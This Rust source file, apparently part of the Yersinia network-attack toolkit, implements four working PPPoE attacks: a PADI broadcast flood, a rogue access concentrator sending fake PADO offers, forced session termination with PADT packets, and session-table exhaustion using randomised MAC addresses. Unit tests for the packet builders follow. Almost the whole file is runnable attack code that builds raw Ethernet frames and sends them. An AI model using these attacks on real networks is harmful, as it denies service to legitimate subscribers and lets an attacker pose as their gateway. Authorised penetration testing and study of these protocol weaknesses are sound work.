//! PPPoE Attack Implementations

use super::packet::{PppoeCode, PppoePacket, PppoeTag, PppoeTagType};
use async_trait::async_trait;
use std::sync::atomic::Ordering;
use std::time::Duration;
use tokio::time;
use yersinia_core::{Attack, AttackContext, AttackStats, Result};
use yersinia_packet::{EtherType, EthernetFrame, MacAddress};

/// PPPoE Discovery DoS Attack
///
/// Floods the network with PADI (initiation) packets to exhaust
/// Access Concentrator resources and prevent legitimate clients
/// from establishing PPPoE sessions.
#[derive(Debug, Clone)]
pub struct PppoeDiscoveryDosAttack {
    /// Service name to request (empty = any service)
    pub service_name: Option<String>,
    /// Rate in packets per second
    pub rate_pps: u32,
    /// Whether to randomize source MAC addresses
    pub randomize_mac: bool,
    /// Whether to randomize host-uniq values
    pub randomize_host_uniq: bool,
    /// Total number of packets to send (None = infinite)
    pub count: Option<u64>,
}

impl PppoeDiscoveryDosAttack {
    pub fn new(rate_pps: u32) -> Self {
        Self {
            service_name: None,
            rate_pps,
            randomize_mac: true,
            randomize_host_uniq: true,
            count: None,
        }
    }

    pub fn with_service(mut self, service: &str) -> Self {
        self.service_name = Some(service.to_string());
        self
    }

    pub fn with_count(mut self, count: u64) -> Self {
        self.count = Some(count);
        self
    }

    pub fn build_packet(&self) -> PppoePacket {
        let host_uniq = if self.randomize_host_uniq {
            (0..8).map(|_| rand::random::<u8>()).collect()
        } else {
            vec![0x00, 0x11, 0x22, 0x33]
        };

        PppoePacket::padi(self.service_name.as_deref(), host_uniq)
    }
}

/// PPPoE Rogue Access Concentrator Attack
///
/// Responds to PADI broadcasts with fake PADO offers, attempting
/// to hijack PPPoE session establishment and become the gateway
/// for victim clients.
#[derive(Debug, Clone)]
pub struct PppoeRogueAcAttack {
    /// Rogue AC name to advertise
    pub ac_name: String,
    /// Service name to offer
    pub service_name: String,
    /// Whether to offer on any service request
    pub offer_any_service: bool,
    /// Custom AC cookie (for session tracking)
    pub ac_cookie: Vec<u8>,
    /// Automatically respond to PADR with PADS
    pub auto_confirm: bool,
    /// Session ID to assign (randomized if None)
    pub session_id: Option<u16>,
}

impl PppoeRogueAcAttack {
    pub fn new(ac_name: &str, service_name: &str) -> Self {
        Self {
            ac_name: ac_name.to_string(),
            service_name: service_name.to_string(),
            offer_any_service: true,
            ac_cookie: vec![0xDE, 0xAD, 0xBE, 0xEF],
            auto_confirm: true,
            session_id: None,
        }
    }

    pub fn build_pado(&self) -> PppoePacket {
        PppoePacket::pado(&self.service_name, &self.ac_name, self.ac_cookie.clone())
    }

    pub fn build_pads(&self, session_id: u16) -> PppoePacket {
        PppoePacket::pads(session_id, &self.service_name)
    }

    pub fn get_session_id(&self) -> u16 {
        self.session_id
            .unwrap_or_else(|| rand::random::<u16>() | 0x0001)
    }
}

/// PPPoE Session Hijacking Attack
///
/// Sends PADT (terminate) packets to forcibly close active PPPoE
/// sessions, causing denial of service for legitimate users.
#[derive(Debug, Clone)]
pub struct PppoeSessionHijackAttack {
    /// Target session ID to terminate
    pub session_id: u16,
    /// Target MAC address (client or server)
    pub target_mac: [u8; 6],
    /// Whether to spoof source MAC as the other party
    pub spoof_mac: bool,
    /// Number of PADT packets to send
    pub count: u32,
    /// Interval between packets (ms)
    pub interval_ms: u32,
}

impl PppoeSessionHijackAttack {
    pub fn new(session_id: u16, target_mac: [u8; 6]) -> Self {
        Self {
            session_id,
            target_mac,
            spoof_mac: true,
            count: 5,
            interval_ms: 100,
        }
    }

    pub fn build_padt(&self) -> PppoePacket {
        PppoePacket::padt(self.session_id)
    }

    /// Build PADT with optional error tag
    pub fn build_padt_with_error(&self, error_msg: &str) -> PppoePacket {
        let tags = vec![PppoeTag::new(
            PppoeTagType::GenericError,
            error_msg.as_bytes().to_vec(),
        )];

        let mut packet = PppoePacket::new_discovery(PppoeCode::PADT, tags);
        packet.session_id = self.session_id;
        packet.length = error_msg.len() as u16 + 4; // tag header + value
        packet
    }
}

/// PPPoE MAC Exhaustion Attack
///
/// Creates multiple PPPoE sessions with different MAC addresses
/// to exhaust the Access Concentrator's session table and prevent
/// new legitimate connections.
#[derive(Debug, Clone)]
pub struct PppoeMacExhaustionAttack {
    /// Service name to request
    pub service_name: String,
    /// Number of sessions to create
    pub session_count: u32,
    /// Rate of session creation (sessions/sec)
    pub rate_sps: u32,
    /// Base MAC address (will increment)
    pub base_mac: [u8; 6],
    /// Whether to completely randomize MACs
    pub randomize_mac: bool,
}

impl PppoeMacExhaustionAttack {
    pub fn new(service_name: &str, session_count: u32) -> Self {
        Self {
            service_name: service_name.to_string(),
            session_count,
            rate_sps: 10,
            base_mac: [0x00, 0x11, 0x22, 0x33, 0x44, 0x00],
            randomize_mac: true,
        }
    }

    pub fn with_rate(mut self, rate_sps: u32) -> Self {
        self.rate_sps = rate_sps;
        self
    }

    /// Generate MAC address for session number
    pub fn get_mac_for_session(&self, session_num: u32) -> [u8; 6] {
        if self.randomize_mac {
            [
                rand::random(),
                rand::random(),
                rand::random(),
                rand::random(),
                rand::random(),
                rand::random(),
            ]
        } else {
            let mut mac = self.base_mac;
            mac[4] = ((session_num >> 8) & 0xFF) as u8;
            mac[5] = (session_num & 0xFF) as u8;
            mac
        }
    }

    /// Build PADI for specific session
    pub fn build_padi(&self, session_num: u32) -> PppoePacket {
        let host_uniq = session_num.to_be_bytes().to_vec();
        PppoePacket::padi(Some(&self.service_name), host_uniq)
    }

    /// Build PADR for specific session
    pub fn build_padr(&self, session_num: u32, ac_cookie: Option<Vec<u8>>) -> PppoePacket {
        let host_uniq = session_num.to_be_bytes().to_vec();
        PppoePacket::padr(&self.service_name, host_uniq, ac_cookie)
    }
}

// ============================================================================
// Attack trait implementations
// ============================================================================

#[async_trait]
impl Attack for PppoeDiscoveryDosAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_micros(1_000_000 / self.rate_pps as u64);
        let mut packets_sent = 0u64;

        while ctx.running.load(Ordering::Relaxed) {
            // Check if we've reached the count limit
            if let Some(max_count) = self.count {
                if packets_sent >= max_count {
                    break;
                }
            }

            // Wait while paused
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }

            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            // Generate source MAC if randomizing
            let src_mac = if self.randomize_mac {
                MacAddress([
                    rand::random(),
                    rand::random(),
                    rand::random(),
                    rand::random(),
                    rand::random(),
                    rand::random(),
                ])
            } else {
                MacAddress(ctx.interface.mac_address.0)
            };

            // Build PPPoE PADI packet
            let pppoe_packet = self.build_packet();
            let pppoe_bytes = pppoe_packet.to_bytes();

            // Build Ethernet frame (PPPoE discovery uses EtherType 0x8863)
            let dst_mac = MacAddress([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]); // Broadcast
            let frame =
                EthernetFrame::new(dst_mac, src_mac, EtherType::PPPoEDiscovery, pppoe_bytes);
            let frame_bytes = frame.to_bytes();

            // Send packet
            if let Err(e) = ctx.interface.send_raw(&frame_bytes) {
                ctx.stats.increment_errors();
                eprintln!("Error sending PPPoE PADI: {}", e);
            } else {
                ctx.stats.increment_packets_sent();
                ctx.stats.add_bytes_sent(frame_bytes.len() as u64);
                packets_sent += 1;
            }

            // Rate limiting
            time::sleep(interval).await;
        }

        Ok(())
    }

    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}

    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }

    fn name(&self) -> &str {
        "PPPoE Discovery DoS"
    }
}

#[async_trait]
impl Attack for PppoeRogueAcAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        // This attack needs to listen for PADI packets and respond with PADO
        // For now, we'll send periodic PADO broadcasts to poison the network
        let interval = Duration::from_secs(1);

        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }

            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            // Build PADO packet
            let pppoe_packet = self.build_pado();
            let pppoe_bytes = pppoe_packet.to_bytes();

            // Build Ethernet frame
            let dst_mac = MacAddress([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]); // Broadcast
            let frame = EthernetFrame::new(
                dst_mac,
                MacAddress(ctx.interface.mac_address.0),
                EtherType::PPPoEDiscovery,
                pppoe_bytes,
            );
            let frame_bytes = frame.to_bytes();

            // Send packet
            if let Err(e) = ctx.interface.send_raw(&frame_bytes) {
                ctx.stats.increment_errors();
                eprintln!("Error sending PPPoE PADO: {}", e);
            } else {
                ctx.stats.increment_packets_sent();
                ctx.stats.add_bytes_sent(frame_bytes.len() as u64);
            }

            time::sleep(interval).await;
        }

        Ok(())
    }

    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}

    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }

    fn name(&self) -> &str {
        "PPPoE Rogue AC"
    }
}

#[async_trait]
impl Attack for PppoeSessionHijackAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_millis(self.interval_ms as u64);

        for i in 0..self.count {
            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }

            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            // Build PADT packet with error message
            let error_msg = format!("Session terminated by Yersinia (packet {})", i + 1);
            let pppoe_packet = self.build_padt_with_error(&error_msg);
            let pppoe_bytes = pppoe_packet.to_bytes();

            // Determine source MAC
            let src_mac = if self.spoof_mac {
                // Spoof as the other party - would need to know which end we're spoofing
                // For now, use interface MAC
                MacAddress(ctx.interface.mac_address.0)
            } else {
                MacAddress(ctx.interface.mac_address.0)
            };

            // Build Ethernet frame
            let dst_mac = MacAddress(self.target_mac);
            let frame =
                EthernetFrame::new(dst_mac, src_mac, EtherType::PPPoEDiscovery, pppoe_bytes);
            let frame_bytes = frame.to_bytes();

            // Send packet
            if let Err(e) = ctx.interface.send_raw(&frame_bytes) {
                ctx.stats.increment_errors();
                eprintln!("Error sending PPPoE PADT: {}", e);
            } else {
                ctx.stats.increment_packets_sent();
                ctx.stats.add_bytes_sent(frame_bytes.len() as u64);
            }

            time::sleep(interval).await;
        }

        Ok(())
    }

    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}

    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }

    fn name(&self) -> &str {
        "PPPoE Session Hijacking"
    }
}

#[async_trait]
impl Attack for PppoeMacExhaustionAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_micros(1_000_000 / self.rate_sps as u64);

        for session_num in 0..self.session_count {
            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }

            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            // Get MAC for this session
            let src_mac = MacAddress(self.get_mac_for_session(session_num));

            // Build PADI packet
            let pppoe_packet = self.build_padi(session_num);
            let pppoe_bytes = pppoe_packet.to_bytes();

            // Build Ethernet frame
            let dst_mac = MacAddress([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]); // Broadcast
            let frame =
                EthernetFrame::new(dst_mac, src_mac, EtherType::PPPoEDiscovery, pppoe_bytes);
            let frame_bytes = frame.to_bytes();

            // Send packet
            if let Err(e) = ctx.interface.send_raw(&frame_bytes) {
                ctx.stats.increment_errors();
                eprintln!(
                    "Error sending PPPoE PADI for session {}: {}",
                    session_num, e
                );
            } else {
                ctx.stats.increment_packets_sent();
                ctx.stats.add_bytes_sent(frame_bytes.len() as u64);
            }

            time::sleep(interval).await;
        }

        Ok(())
    }

    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}

    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }

    fn name(&self) -> &str {
        "PPPoE MAC Exhaustion"
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_discovery_dos_attack() {
        let attack = PppoeDiscoveryDosAttack::new(100)
            .with_service("internet")
            .with_count(1000);

        let packet = attack.build_packet();
        assert_eq!(packet.code, PppoeCode::PADI);
        assert!(packet.tags.len() >= 2); // service name + host-uniq
    }

    #[test]
    fn test_rogue_ac_attack() {
        let attack = PppoeRogueAcAttack::new("Evil-AC", "free-internet");
        let pado = attack.build_pado();

        assert_eq!(pado.code, PppoeCode::PADO);
        assert!(pado.tags.iter().any(|t| t.tag_type == PppoeTagType::ACName));
    }

    #[test]
    fn test_session_hijack_attack() {
        let attack = PppoeSessionHijackAttack::new(0x1234, [0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF]);

        let padt = attack.build_padt();
        assert_eq!(padt.code, PppoeCode::PADT);
        assert_eq!(padt.session_id, 0x1234);
    }

    #[test]
    fn test_mac_exhaustion_attack() {
        let attack = PppoeMacExhaustionAttack::new("broadband", 100).with_rate(20);

        let padi = attack.build_padi(42);
        assert_eq!(padi.code, PppoeCode::PADI);

        let mac1 = attack.get_mac_for_session(1);
        let mac2 = attack.get_mac_for_session(2);
        // MACs should differ when randomized
        assert_ne!(mac1, mac2);
    }
}
